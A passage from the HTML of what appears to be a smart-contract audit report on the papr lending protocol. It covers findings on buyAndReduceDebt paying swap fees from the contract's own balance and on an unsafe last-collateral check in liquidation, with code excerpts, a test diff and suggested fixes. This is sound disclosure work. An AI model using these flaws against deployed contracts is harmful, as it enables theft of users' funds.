style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-8\" aria-label=\"recommended mitigation steps 8 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>The swapped papr token should be sent to the <code>msg.sender</code> instead of <code>account</code> such that they can then be burnt from <code>msg.sender</code>.</p>\n<p>In order to achieve this, a single line in <code>PaprController.buyAndReduceDebt</code> must be changed:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"37\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">amountOut</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">amountIn</span><span class=\"mtk1\">) = </span><span class=\"mtk12\">UniswapHelpers</span><span class=\"mtk1\">.</span><span class=\"mtk11\">swap</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">             </span><span class=\"mtk12\">pool</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">-            </span><span class=\"mtk12\">account</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">+            </span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">             </span><span class=\"mtk12\">token0IsUnderlying</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">             </span><span class=\"mtk12\">params</span><span class=\"mtk1\">.</span><span class=\"mtk12\">amount</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">             </span><span class=\"mtk12\">params</span><span class=\"mtk1\">.</span><span class=\"mtk12\">minOut</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">             </span><span class=\"mtk12\">params</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sqrtPriceLimitX96</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">abi</span><span class=\"mtk1\">.</span><span class=\"mtk11\">encode</span><span class=\"mtk1\">(</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        );</span></span></span></code></pre>\n<p><strong><a href=\"https://github.com/code-423n4/2022-12-backed-findings/issues/187\">wilsoncusack (Backed) confirmed</a></strong> </p>\n<hr>\n<h2 id=\"m-06-paprcontroller-pays-swap-fee-in-buyandreducedebt-not-user\" style=\"position:relative;\"><a href=\"#m-06-paprcontroller-pays-swap-fee-in-buyandreducedebt-not-user\" aria-label=\"m 06 paprcontroller pays swap fee in buyandreducedebt not user permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2022-12-backed-findings/issues/196\">[M-06] <code>PaprController</code> pays swap fee in <code>buyAndReduceDebt</code>, not user</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2022-12-backed-findings/issues/196\">Jeiwan</a>, also found by <a href=\"https://github.com/code-423n4/2022-12-backed-findings/issues/304\">HollaDieWaldfee</a>, <a href=\"https://github.com/code-423n4/2022-12-backed-findings/issues/301\">unforgiven</a>, <a href=\"https://github.com/code-423n4/2022-12-backed-findings/issues/270\">evan</a>, <a href=\"https://github.com/code-423n4/2022-12-backed-findings/issues/264\">Franfran</a>, <a href=\"https://github.com/code-423n4/2022-12-backed-findings/issues/263\">teawaterwire</a>, <a href=\"https://github.com/code-423n4/2022-12-backed-findings/issues/230\">bin2chen</a>, <a href=\"https://github.com/code-423n4/2022-12-backed-findings/issues/189\">poirots</a>, <a href=\"https://github.com/code-423n4/2022-12-backed-findings/issues/174\">fs0c</a>, <a href=\"https://github.com/code-423n4/2022-12-backed-findings/issues/123\">KingNFT</a>, <a href=\"https://github.com/code-423n4/2022-12-backed-findings/issues/116\">noot</a>, <a href=\"https://github.com/code-423n4/2022-12-backed-findings/issues/113\">0x52</a>, <a href=\"https://github.com/code-423n4/2022-12-backed-findings/issues/103\">rvierdiiev</a>, <a href=\"https://github.com/code-423n4/2022-12-backed-findings/issues/60\">Saintcode_</a>, and <a href=\"https://github.com/code-423n4/2022-12-backed-findings/issues/20\">stealthyz</a></em></p>\n<p>Since <code>PaprController</code> is not designed to hold any underlying tokens, calling <code>buyAndReduceDebt</code> with a swap fee set will result in a revert. The function can also be used to transfer out any underlying tokens sent to the contract mistakenly.</p>\n<h3 id=\"proof-of-concept-9\" style=\"position:relative;\"><a href=\"#proof-of-concept-9\" aria-label=\"proof of concept 9 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p><code>PaprController</code> implements the <code>buyAndReduceDebt</code> function, which allows users to buy Papr tokens for underlying tokens and burn them to reduce their debt (<a href=\"https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L208\">PaprController.sol#L208</a>). Optionally, the function allows the caller to specify a swap fee: a fee that’s collected from the caller. However, in reality, the fee is collected from <code>PaprController</code> itself: <code>transfer</code> instead of <code>transferFrom</code> is called on the underlying token (<a href=\"https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L225-L227\">PaprController.sol#L225-L227</a>):</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"38\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">hasFee</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">underlying</span><span class=\"mtk1\">.</span><span class=\"mtk11\">transfer</span><span class=\"mtk1\">(</span><span class=\"mtk12\">params</span><span class=\"mtk1\">.</span><span class=\"mtk12\">swapFeeTo</span><span class=\"mtk1\">, </span><span class=\"mtk12\">amountIn</span><span class=\"mtk1\"> * </span><span class=\"mtk12\">params</span><span class=\"mtk1\">.</span><span class=\"mtk12\">swapFeeBips</span><span class=\"mtk1\"> / </span><span class=\"mtk12\">BIPS_ONE</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span></code></pre>\n<p>This scenario is covered by the <code>testBuyAndReduceDebtReducesDebt</code> test (<a href=\"https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/test/paprController/BuyAndReduceDebt.t.sol#L12\">BuyAndReduceDebt.t.sol#L12</a>), however the fee is not actually set in the test:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"39\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">// Fee is initialized but not set.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">fee</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">underlying</span><span class=\"mtk1\">.</span><span class=\"mtk11\">approve</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">controller</span><span class=\"mtk1\">), </span><span class=\"mtk12\">underlyingOut</span><span class=\"mtk1\"> + </span><span class=\"mtk12\">underlyingOut</span><span class=\"mtk1\"> * </span><span class=\"mtk12\">fee</span><span class=\"mtk1\"> / </span><span class=\"mtk7\">1e4</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">swapParams</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">IPaprController</span><span class=\"mtk1\">.</span><span class=\"mtk11\">SwapParams</span><span class=\"mtk1\">({</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">amount:</span><span class=\"mtk1\"> </span><span class=\"mtk12\">underlyingOut</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">minOut:</span><span class=\"mtk1\"> </span><span class=\"mtk7\">1</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">sqrtPriceLimitX96:</span><span class=\"mtk1\"> </span><span class=\"mtk11\">_maxSqrtPriceLimit</span><span class=\"mtk1\">({</span><span class=\"mtk12\">sellingPAPR:</span><span class=\"mtk1\"> </span><span class=\"mtk4\">false</span><span class=\"mtk1\">}),</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">swapFeeTo:</span><span class=\"mtk1\"> </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk7\">5</span><span class=\"mtk1\">),</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">swapFeeBips:</span><span class=\"mtk1\"> </span><span class=\"mtk12\">fee</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">});</span></span></span></code></pre>\n<p>If fee is set in the test, the test wil revert with an “Arithmetic over/underflow” error:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"40\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">--- a/test/paprController/BuyAndReduceDebt.t.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">+++ b/test/paprController/BuyAndReduceDebt.t.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -26,7 +26,7 @@ contract BuyAndReduceDebt is BasePaprControllerTest {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         IPaprController.VaultInfo memory vaultInfo = controller.vaultInfo(borrower, collateral.addr);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         assertEq(vaultInfo.debt, debt);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         assertEq(underlyingOut, underlying.balanceOf(borrower));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-        uint256 fee;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        uint256 fee = 1e3;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         underlying.approve(address(controller), underlyingOut + underlyingOut * fee / 1e4);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         swapParams = IPaprController.SwapParams({</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">             amount: underlyingOut,</span></span></span></code></pre>\n<h3 id=\"recommended-mitigation-steps-9\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-9\" aria-label=\"recommended mitigation steps 9 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Consider this change:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"41\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">--- a/src/PaprController.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">+++ b/src/PaprController.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -223,7 +223,7 @@ contract PaprController is</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         if (hasFee) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-            underlying.transfer(params.swapFeeTo, amountIn * params.swapFeeBips / BIPS_ONE);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+            underlying.safeTransferFrom(msg.sender, params.swapFeeTo, amountIn * params.swapFeeBips / BIPS_ONE);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         _reduceDebt({account: account, asset: collateralAsset, burnFrom: msg.sender, amount: amountOut});</span></span></span></code></pre>\n<p><strong><a href=\"https://github.com/code-423n4/2022-12-backed-findings/issues/20\">wilsoncusack (Backed) confirmed</a></strong> </p>\n<p><strong><a href=\"https://github.com/code-423n4/2022-12-backed-findings/issues/196#issuecomment-1370741970\">trust1995 (judge) commented</a>:</strong></p>\n<blockquote>\n<p>Chosen as best because it shows how to improve an existing test, well done.</p>\n</blockquote>\n<hr>\n<h2 id=\"m-07-last-collateral-check-is-not-safe\" style=\"position:relative;\"><a href=\"#m-07-last-collateral-check-is-not-safe\" aria-label=\"m 07 last collateral check is not safe permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2022-12-backed-findings/issues/216\">[M-07] Last collateral check is not safe</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2022-12-backed-findings/issues/216\">hansfriese</a></em></p>\n<p>Liquidation might work incorrectly.</p>\n<h3 id=\"proof-of-concept-10\" style=\"position:relative;\"><a href=\"#proof-of-concept-10\" aria-label=\"proof of concept 10 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>There is a function <code>purchaseLiquidationAuctionNFT()</code> to allow liquidators to purchase NFTs on auction.</p>\n<p>In the line 273, the protocol checks if the current NFT is the last collateral using the <code>collateralValueCached</code>.</p>\n<p>But it might be possible for Reservoir Oracle to return zero (for whatever reason) and in that case <code>collateralValueCached</code> will be zero even when the <code>_vaultInfo[auction.nftOwner][auction.auctionAssetContract].count!=0</code>.</p>\n<p>One might argue that it is impossible for the Reservoir oracle to return zero output but I think it is safe not to rely on it.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"42\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">PaprController</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">264</span><span class=\"mtk1\">:     </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">purchaseLiquidationAuctionNFT</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">265:         </span><span class=\"mtk10\">Auction</span><span class=\"mtk1\"> </span><span class=\"mtk10\">calldata</span><span class=\"mtk1\"> </span><span class=\"mtk10\">auction</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">266:         </span><span class=\"mtk10\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk10\">maxPrice</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">267:         </span><span class=\"mtk10\">address</span><span class=\"mtk1\"> </span><span class=\"mtk10\">sendTo</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">268:         </span><span class=\"mtk10\">ReservoirOracleUnderwriter</span><span class=\"mtk1\">.</span><span class=\"mtk10\">OracleInfo</span><span class=\"mtk1\"> </span><span class=\"mtk10\">calldata</span><span class=\"mtk1\"> </span><span class=\"mtk10\">oracleInfo</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">269</span><span class=\"mtk1\">:     ) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">override</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">270</span><span class=\"mtk1\">:         </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">collateralValueCached</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">underwritePriceForCollateral</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">271</span><span class=\"mtk1\">:             </span><span class=\"mtk12\">auction</span><span class=\"mtk1\">.</span><span class=\"mtk12\">auctionAssetContract</span><span class=\"mtk1\">, </span><span class=\"mtk12\">ReservoirOracleUnderwriter</span><span class=\"mtk1\">.</span><span class=\"mtk12\">PriceKind</span><span class=\"mtk1\">.</span><span class=\"mtk12\">TWAP</span><span class=\"mtk1\">, </span><span class=\"mtk12\">oracleInfo</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">272</span><span class=\"mtk1\">:         ) * </span><span class=\"mtk12\">_vaultInfo</span><span class=\"mtk1\">[</span><span class=\"mtk12\">auction</span><span class=\"mtk1\">.</span><span class=\"mtk12\">nftOwner</span><span class=\"mtk1\">][</span><span class=\"mtk12\">auction</span><span class=\"mtk1\">.</span><span class=\"mtk12\">auctionAssetContract</span><span class=\"mtk1\">].</span><span class=\"mtk12\">count</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">273</span><span class=\"mtk1\">:         </span><span class=\"mtk12\">bool</span><span class=\"mtk1\"> </span><span class=\"mtk12\">isLastCollateral</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">collateralValueCached</span><span class=\"mtk1\"> == </span><span class=\"mtk7\">0</span><span class=\"mtk1\">;</span><span class=\"mtk3\">//@audit not safe</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">274</span><span class=\"mtk1\">:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">275</span><span class=\"mtk1\">:         </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">debtCached</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">_vaultInfo</span><span class=\"mtk1\">[</span><span class=\"mtk12\">auction</span><span class=\"mtk1\">.</span><span class=\"mtk12\">nftOwner</span><span class=\"mtk1\">][</span><span class=\"mtk12\">auction</span><span class=\"mtk1\">.</span><span class=\"mtk12\">auctionAssetContract</span><span class=\"mtk1\">].</span><span class=\"mtk12\">debt</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">276</span><span class=\"mtk1\">:         </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">maxDebtCached</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">isLastCollateral</span><span class=\"mtk1\"> ? </span><span class=\"mtk12\">debtCached</span><span class=\"mtk1\"> : </span><span class=\"mtk11\">_maxDebt</span><span class=\"mtk1\">(</span><span class=\"mtk12\">collateralValueCached</span><span class=\"mtk1\">, </span><span class=\"mtk11\">updateTarget</span><span class=\"mtk1\">());</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">277</span><span class=\"mtk1\">:         </span><span class=\"mtk3\">/// anything above what is needed to bring this vault under maxDebt is considered excess</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">278</span><span class=\"mtk1\">:         </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">neededToSaveVault</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">maxDebtCached</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk12\">debtCached</span><span class=\"mtk1\"> ? </span><span class=\"mtk7\">0</span><span class=\"mtk1\"> : </span><span class=\"mtk12\">debtCached</span><span class=\"mtk1\"> - </span><span class=\"mtk12\">maxDebtCached</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">279</span><span class=\"mtk1\">:         </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">price</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">_purchaseNFTAndUpdateVaultIfNeeded</span><span class=\"mtk1\">(</span><span class=\"mtk12\">auction</span><span class=\"mtk1\">, </span><span class=\"mtk12\">maxPrice</span><span class=\"mtk1\">, </span><span class=\"mtk12\">sendTo</span><span class=\"mtk1\">);</span><span class=\"mtk12\">time</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">280</span><span class=\"mtk1\">:         </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">excess</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">price</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk12\">neededToSaveVault</span><span class=\"mtk1\"> ? </span><span class=\"mtk12\">price</span><span class=\"mtk1\"> - </span><span class=\"mtk12\">neededToSaveVault</span><span class=\"mtk1\"> : </span><span class=\"mtk7\">0</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">281</span><span class=\"mtk1\">:         </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">remaining</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">282</span><span class=\"mtk1\">:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">283</span><span class=\"mtk1\">:         </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">excess</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk7\">0</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">284</span><span class=\"mtk1\">:             </span><span class=\"mtk12\">remaining</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">_handleExcess</span><span class=\"mtk1\">(</span><span class=\"mtk12\">excess</span><span class=\"mtk1\">, </span><span class=\"mtk12\">neededToSaveVault</span><span class=\"mtk1\">, </span><span class=\"mtk12\">debtCached</span><span class=\"mtk1\">, </span><span class=\"mtk12\">auction</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">285</span><span class=\"mtk1\">:         } </span><span class=\"mtk15\">else</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">286</span><span class=\"mtk1\">:             </span><span class=\"mtk11\">_reduceDebt</span><span class=\"mtk1\">(</span><span class=\"mtk12\">auction</span><span class=\"mtk1\">.</span><span class=\"mtk12\">nftOwner</span><span class=\"mtk1\">, </span><span class=\"mtk12\">auction</span><span class=\"mtk1\">.</span><span class=\"mtk12\">auctionAssetContract</span><span class=\"mtk1\">, </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">), </span><span class=\"mtk12\">price</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">287</span><span class=\"mtk1\">:             </span><span class=\"mtk12\">remaining</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">debtCached</span><span class=\"mtk1\"> - </span><span class=\"mtk12\">price</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">288</span><span class=\"mtk1\">:         }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">289</span><span class=\"mtk1\">:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">290</span><span class=\"mtk1\">:         </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">isLastCollateral</span><span class=\"mtk1\"> &amp;&amp; </span><span class=\"mtk12\">remaining</span><span 